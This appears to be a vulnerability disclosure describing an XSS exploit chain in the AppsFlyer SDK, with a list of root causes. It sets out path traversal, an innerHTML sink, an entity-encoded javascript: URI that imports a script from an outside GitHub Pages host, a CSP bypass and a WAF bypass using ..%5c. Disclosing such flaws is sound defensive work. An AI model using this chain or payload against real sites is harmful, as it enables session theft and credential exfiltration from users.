How It Works

  1. Path traversal: af-sb-id has no UUID validation. ../../ traverses to attacker's AF workspace key + creative.
  2. innerHTML sink: Creative layout HTML injected via _createElement() → div.innerHTML = layout with no sanitization.
  3. javascript: URI: HTML entity s decodes to s → href="javascript:import('//s1n6h.github.io/x.js')" survives in DOM.
  4. CSP bypass: SDK's _inject() creates <script> via document.createElement('script') + innerHTML + appendChild. This is a dynamically-inserted script, which strict-dynamic trusts → bypasses CSP.
  5. WAF bypass: CloudFront blocks ../ in query strings. Backslash ..%5c bypasses WAF. Browser normalizes \ → / in HTTPS URL paths (WHATWG URL spec).

Payload: x.js

Hosted at: https://s1n6h.github.io/x.js

Currently: alert(origin) (PoC only). In a real attack: wallet drain, session theft, credential exfiltration.

Root Causes (all in AppsFlyer SDK)

  1. No validation on af-sb-id before URL construction
  2. No HTML sanitization in _createElement() — raw innerHTML sink
  3. No filtering of javascript: URIs in creative layouts
  4. Creative script field injected via createElement('script') — bypasses CSP
